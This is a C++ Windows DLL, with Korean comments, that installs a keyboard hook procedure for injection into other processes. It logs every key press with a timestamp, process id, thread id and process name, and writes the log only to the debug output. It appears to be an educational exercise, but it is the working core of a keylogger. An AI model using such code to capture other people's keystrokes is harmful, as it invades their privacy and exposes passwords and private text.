#include "windows.h"
#include "TCHAR.h"
#include "psapi.h"

#define EXPORT extern "C" __declspec(dllexport)
EXPORT LRESULT CALLBACK KeyboardProc(int Code, WPARAM wParam, LPARAM lParam);
void WriteLog(WPARAM wParam);

int LoadPid;
int LoadTid;

extern "C" BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ReasonCode, LPVOID lpReserved) {
    switch (ReasonCode) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        // 스레드 생성, 호출 시, DllMain이 호출되지 않도록 한다.
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

EXPORT LRESULT CALLBACK KeyboardProc(int Code, WPARAM wParam, LPARAM lParam) {
    if ((Code == HC_ACTION) || (Code == HC_NOREMOVE)) {
        // If code is less than zero, the hook procedure must pass the message to the CallNextHookEx function without further processing and should return the value returned by CallNextHookEx.
        // If code is greater than or equal to zero, and the hook procedure did not process the message, it is highly recommended that you call CallNextHookEx and return the value it returns;
        // MSDN에 명시된 예외 처리 (https://learn.microsoft.com/en-us/windows/win32/winmsg/keyboardproc)

        if (!(lParam & 0x80000000)) {
            WriteLog(wParam);
        } // 키가 눌렸을 때, 로그 작성
    }

    return CallNextHookEx(0, Code, wParam, lParam);
}


EXPORT void SetLoadThreadInfo(int pid, int tid) {
    LoadPid = pid;
    LoadTid = tid;
}

BOOL CmpLoadThreadInfo(int pid, int tid) {
    //_tprintf(L"%d %d / %d %d\n", LoadPid, LoadTid, pid, tid);
    if ((LoadPid == pid) && (LoadTid == tid)) return TRUE;
    return FALSE;
}


BOOL GetProcessName(TCHAR* FilePath, DWORD PathSize, TCHAR** FileName, BOOL SelfMsg) {
    if (SelfMsg) {
        // 현재 스레드 컨텍스트는 인젝터입니다.

        HWND hWnd = GetForegroundWindow();
        if (hWnd == NULL) return FALSE;
        // 현재 활성화된 윈도우 핸들을 구합니다.

        DWORD pid = 0;
        GetWindowThreadProcessId(hWnd, &pid);
        if (pid == 0) return FALSE;
        // 윈도우 핸들의 PID를 구합니다.

        HANDLE hProcess = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE,
            pid
        ); 
        if (hProcess == NULL) return FALSE;
        // 프로세스 핸들을 구합니다.

        DWORD PathSizeTmp = PathSize;
        if (!QueryFullProcessImageName(hProcess, 0, FilePath, &PathSizeTmp)) {
            // QueryFullProcessImageName로 파일 경로를 구하고,
            if (GetModuleFileNameEx(hProcess, NULL, FilePath, PathSize) == 0) {
                // 실패시 GetModuleFileNameEx로 파일 경로를 구합니다.
                CloseHandle(hProcess);
                return FALSE;
            }
        }
        CloseHandle(hProcess);
    } else {
        // 현재 스레드 컨텍스트는 DLL Injection된 프로세스입니다.
        if (GetModuleFileName(NULL, FilePath, PathSize) == 0) return FALSE;
    }

    *FileName = _tcsrchr(FilePath, _T('\\'));
    if (*FileName != NULL) (*FileName)++;
    // 파일 이름은 전체 경로에서 마지막 \ 이후의 문자부터 시작합니다.
    return TRUE;
}


void WriteLog(WPARAM wParam) {

    int pid = GetCurrentProcessId();
    int tid = GetCurrentThreadId();
    // 자기 자신의 pid / tid 구하기 

    SYSTEMTIME localTime;
    GetLocalTime(&localTime);
    // 현재 시간 구하기 (Win32API)

    TCHAR FilePath[MAX_PATH] = { 0 };
    ZeroMemory(FilePath, sizeof(FilePath));
    TCHAR* FileName = NULL;

    BOOL SelfMsgFlag = CmpLoadThreadInfo(pid, tid);
    // 현재 해당 훅 프로시저가 실행된 스레드 컨텍스트가 자신인지 알아냅니다.
    if (!GetProcessName(FilePath, MAX_PATH, &FileName, SelfMsgFlag)) return;
    // 스레드 컨텍스트에 따라 프로세스 파일 이름을 구합니다.

    TCHAR Desc[255] = { 0 };
    ZeroMemory(Desc, sizeof(Desc));
    switch (wParam) {
        case 'A': _tcsncpy_s(Desc, 255, TEXT("A key"), _TRUNCATE); break;
        case 'B': _tcsncpy_s(Desc, 255, TEXT("B key"), _TRUNCATE); break;
        case 'C': _tcsncpy_s(Desc, 255, TEXT("C key"), _TRUNCATE); break;
        case 'D': _tcsncpy_s(Desc, 255, TEXT("D key"), _TRUNCATE); break;
        case 'E': _tcsncpy_s(Desc, 255, TEXT("E key"), _TRUNCATE); break;
        case 'F': _tcsncpy_s(Desc, 255, TEXT("F key"), _TRUNCATE); break;
        case 'G': _tcsncpy_s(Desc, 255, TEXT("G key"), _TRUNCATE); break;
        case 'H': _tcsncpy_s(Desc, 255, TEXT("H key"), _TRUNCATE); break;
        case 'I': _tcsncpy_s(Desc, 255, TEXT("I key"), _TRUNCATE); break;
        case 'J': _tcsncpy_s(Desc, 255, TEXT("J key"), _TRUNCATE); break;
        case 'K': _tcsncpy_s(Desc, 255, TEXT("K key"), _TRUNCATE); break;
        case 'L': _tcsncpy_s(Desc, 255, TEXT("L key"), _TRUNCATE); break;
        case 'M': _tcsncpy_s(Desc, 255, TEXT("M key"), _TRUNCATE); break;
        case 'N': _tcsncpy_s(Desc, 255, TEXT("N key"), _TRUNCATE); break;
        case 'O': _tcsncpy_s(Desc, 255, TEXT("O key"), _TRUNCATE); break;
        case 'P': _tcsncpy_s(Desc, 255, TEXT("P key"), _TRUNCATE); break;
        case 'Q': _tcsncpy_s(Desc, 255, TEXT("Q key"), _TRUNCATE); break;
        case 'R': _tcsncpy_s(Desc, 255, TEXT("R key"), _TRUNCATE); break;
        case 'S': _tcsncpy_s(Desc, 255, TEXT("S key"), _TRUNCATE); break;
        case 'T': _tcsncpy_s(Desc, 255, TEXT("T key"), _TRUNCATE); break;
        case 'U': _tcsncpy_s(Desc, 255, TEXT("U key"), _TRUNCATE); break;
        case 'V': _tcsncpy_s(Desc, 255, TEXT("V key"), _TRUNCATE); break;
        case 'W': _tcsncpy_s(Desc, 255, TEXT("W key"), _TRUNCATE); break;
        case 'X': _tcsncpy_s(Desc, 255, TEXT("X key"), _TRUNCATE); break;
        case 'Y': _tcsncpy_s(Desc, 255, TEXT("Y key"), _TRUNCATE); break;
        case 'Z': _tcsncpy_s(Desc, 255, TEXT("Z key"), _TRUNCATE); break;
        case '0': _tcsncpy_s(Desc, 255, TEXT("0 key"), _TRUNCATE); break;
        case '1': _tcsncpy_s(Desc, 255, TEXT("1 key"), _TRUNCATE); break;
        case '2': _tcsncpy_s(Desc, 255, TEXT("2 key"), _TRUNCATE); break;
        case '3': _tcsncpy_s(Desc, 255, TEXT("3 key"), _TRUNCATE); break;
        case '4': _tcsncpy_s(Desc, 255, TEXT("4 key"), _TRUNCATE); break;
        case '5': _tcsncpy_s(Desc, 255, TEXT("5 key"), _TRUNCATE); break;
        case '6': _tcsncpy_s(Desc, 255, TEXT("6 key"), _TRUNCATE); break;
        case '7': _tcsncpy_s(Desc, 255, TEXT("7 key"), _TRUNCATE); break;
        case '8': _tcsncpy_s(Desc, 255, TEXT("8 key"), _TRUNCATE); break;
        case '9': _tcsncpy_s(Desc, 255, TEXT("9 key"), _TRUNCATE); break;
        case VK_F1:  _tcsncpy_s(Desc, 255, TEXT("F1 key"), _TRUNCATE); break;
        case VK_F2:  _tcsncpy_s(Desc, 255, TEXT("F2 key"), _TRUNCATE); break;
        case VK_F3:  _tcsncpy_s(Desc, 255, TEXT("F3 key"), _TRUNCATE); break;
        case VK_F4:  _tcsncpy_s(Desc, 255, TEXT("F4 key"), _TRUNCATE); break;
        case VK_F5:  _tcsncpy_s(Desc, 255, TEXT("F5 key"), _TRUNCATE); break;
        case VK_F6:  _tcsncpy_s(Desc, 255, TEXT("F6 key"), _TRUNCATE); break;
        case VK_F7:  _tcsncpy_s(Desc, 255, TEXT("F7 key"), _TRUNCATE); break;
        case VK_F8:  _tcsncpy_s(Desc, 255, TEXT("F8 key"), _TRUNCATE); break;
        case VK_F9:  _tcsncpy_s(Desc, 255, TEXT("F9 key"), _TRUNCATE); break;
        case VK_F10: _tcsncpy_s(Desc, 255, TEXT("F10 key"), _TRUNCATE); break;
        case VK_F11: _tcsncpy_s(Desc, 255, TEXT("F11 key"), _TRUNCATE); break;
        case VK_F12: _tcsncpy_s(Desc, 255, TEXT("F12 key"), _TRUNCATE); break;
        case VK_F13: _tcsncpy_s(Desc, 255, TEXT("F13 key"), _TRUNCATE); break;
        case VK_F14: _tcsncpy_s(Desc, 255, TEXT("F14 key"), _TRUNCATE); break;
        case VK_F15: _tcsncpy_s(Desc, 255, TEXT("F15 key"), _TRUNCATE); break;
        case VK_F16: _tcsncpy_s(Desc, 255, TEXT("F16 key"), _TRUNCATE); break;
        case VK_F17: _tcsncpy_s(Desc, 255, TEXT("F17 key"), _TRUNCATE); break;
        case VK_F18: _tcsncpy_s(Desc, 255, TEXT("F18 key"), _TRUNCATE); break;
        case VK_F19: _tcsncpy_s(Desc, 255, TEXT("F19 key"), _TRUNCATE); break;
        case VK_F20: _tcsncpy_s(Desc, 255, TEXT("F20 key"), _TRUNCATE); break;
        case VK_F21: _tcsncpy_s(Desc, 255, TEXT("F21 key"), _TRUNCATE); break;
        case VK_F22: _tcsncpy_s(Desc, 255, TEXT("F22 key"), _TRUNCATE); break;
        case VK_F23: _tcsncpy_s(Desc, 255, TEXT("F23 key"), _TRUNCATE); break;
        case VK_F24: _tcsncpy_s(Desc, 255, TEXT("F24 key"), _TRUNCATE); break;
        case VK_LEFT:   _tcsncpy_s(Desc, 255, TEXT("Left Arrow key"), _TRUNCATE); break;
        case VK_RIGHT:  _tcsncpy_s(Desc, 255, TEXT("Right Arrow key"), _TRUNCATE); break;
        case VK_UP:     _tcsncpy_s(Desc, 255, TEXT("Up Arrow key"), _TRUNCATE); break;
        case VK_DOWN:   _tcsncpy_s(Desc, 255, TEXT("Down Arrow key"), _TRUNCATE); break;
        case VK_BACK:   _tcsncpy_s(Desc, 255, TEXT("Backspace key"), _TRUNCATE); break;
        case VK_TAB:    _tcsncpy_s(Desc, 255, TEXT("Tab key"), _TRUNCATE); break;
        case VK_RETURN: _tcsncpy_s(Desc, 255, TEXT("Enter key"), _TRUNCATE); break;
        case VK_ESCAPE: _tcsncpy_s(Desc, 255, TEXT("Escape key"), _TRUNCATE); break;
        case VK_SPACE:  _tcsncpy_s(Desc, 255, TEXT("Spacebar"), _TRUNCATE); break;
        case VK_SHIFT:   _tcsncpy_s(Desc, 255, TEXT("Shift key"), _TRUNCATE); break;
        case VK_LSHIFT:  _tcsncpy_s(Desc, 255, TEXT("Left Shift key"), _TRUNCATE); break;
        case VK_RSHIFT:  _tcsncpy_s(Desc, 255, TEXT("Right Shift key"), _TRUNCATE); break;
        case VK_CONTROL: _tcsncpy_s(Desc, 255, TEXT("Control key"), _TRUNCATE); break;
        case VK_LCONTROL:_tcsncpy_s(Desc, 255, TEXT("Left Control key"), _TRUNCATE); break;
        case VK_RCONTROL:_tcsncpy_s(Desc, 255, TEXT("Right Control key"), _TRUNCATE); break;
        case VK_MENU:    _tcsncpy_s(Desc, 255, TEXT("Alt key"), _TRUNCATE); break;
        case VK_LMENU:   _tcsncpy_s(Desc, 255, TEXT("Left Alt key"), _TRUNCATE); break;
        case VK_RMENU:   _tcsncpy_s(Desc, 255, TEXT("Right Alt key"), _TRUNCATE); break;
        case VK_CAPITAL: _tcsncpy_s(Desc, 255, TEXT("Caps Lock key"), _TRUNCATE); break;
        case VK_NUMLOCK: _tcsncpy_s(Desc, 255, TEXT("Num Lock key"), _TRUNCATE); break;
        case VK_SCROLL:  _tcsncpy_s(Desc, 255, TEXT("Scroll Lock key"), _TRUNCATE); break;
        case VK_DELETE:  _tcsncpy_s(Desc, 255, TEXT("Delete key"), _TRUNCATE); break;
        case VK_INSERT:  _tcsncpy_s(Desc, 255, TEXT("Insert key"), _TRUNCATE); break;
        case VK_HOME:    _tcsncpy_s(Desc, 255, TEXT("Home key"), _TRUNCATE); break;
        case VK_END:     _tcsncpy_s(Desc, 255, TEXT("End key"), _TRUNCATE); break;
        case VK_PRIOR:   _tcsncpy_s(Desc, 255, TEXT("Page Up key"), _TRUNCATE); break;
        case VK_NEXT:    _tcsncpy_s(Desc, 255, TEXT("Page Down key"), _TRUNCATE); break;
        case VK_LWIN:    _tcsncpy_s(Desc, 255, TEXT("Left Windows key"), _TRUNCATE); break;
        case VK_RWIN:    _tcsncpy_s(Desc, 255, TEXT("Right Windows key"), _TRUNCATE); break;
        case VK_APPS:    _tcsncpy_s(Desc, 255, TEXT("Application/Menu key"), _TRUNCATE); break;
        case VK_NUMPAD0: _tcsncpy_s(Desc, 255, TEXT("Numpad 0"), _TRUNCATE); break;
        case VK_NUMPAD1: _tcsncpy_s(Desc, 255, TEXT("Numpad 1"), _TRUNCATE); break;
        case VK_NUMPAD2: _tcsncpy_s(Desc, 255, TEXT("Numpad 2"), _TRUNCATE); break;
        case VK_NUMPAD3: _tcsncpy_s(Desc, 255, TEXT("Numpad 3"), _TRUNCATE); break;
        case VK_NUMPAD4: _tcsncpy_s(Desc, 255, TEXT("Numpad 4"), _TRUNCATE); break;
        case VK_NUMPAD5: _tcsncpy_s(Desc, 255, TEXT("Numpad 5"), _TRUNCATE); break;
        case VK_NUMPAD6: _tcsncpy_s(Desc, 255, TEXT("Numpad 6"), _TRUNCATE); break;
        case VK_NUMPAD7: _tcsncpy_s(Desc, 255, TEXT("Numpad 7"), _TRUNCATE); break;
        case VK_NUMPAD8: _tcsncpy_s(Desc, 255, TEXT("Numpad 8"), _TRUNCATE); break;
        case VK_NUMPAD9: _tcsncpy_s(Desc, 255, TEXT("Numpad 9"), _TRUNCATE); break;
        case VK_ADD:       _tcsncpy_s(Desc, 255, TEXT("Numpad +"), _TRUNCATE); break;
        case VK_SUBTRACT:  _tcsncpy_s(Desc, 255, TEXT("Numpad -"), _TRUNCATE); break;
        case VK_MULTIPLY:  _tcsncpy_s(Desc, 255, TEXT("Numpad *"), _TRUNCATE); break;
        case VK_DIVIDE:    _tcsncpy_s(Desc, 255, TEXT("Numpad /"), _TRUNCATE); break;
        case VK_DECIMAL:   _tcsncpy_s(Desc, 255, TEXT("Numpad ."), _TRUNCATE); break;
        default: return;
    }

    TCHAR Message[1024];
    _stprintf_s(
        Message,
        1024,
        _T("[KeyHook][%04d/%02d/%02d %02d:%02d:%02d.%03d][p%d][t%d][%ls] %ls Pressed.\n"),
        localTime.wYear,
        localTime.wMonth,
        localTime.wDay,
        localTime.wHour,
        localTime.wMinute,
        localTime.wSecond,
        localTime.wMilliseconds,
        pid,
        tid,
        FileName,
        Desc
    );
    // 메시지 조합
    OutputDebugString(Message);
}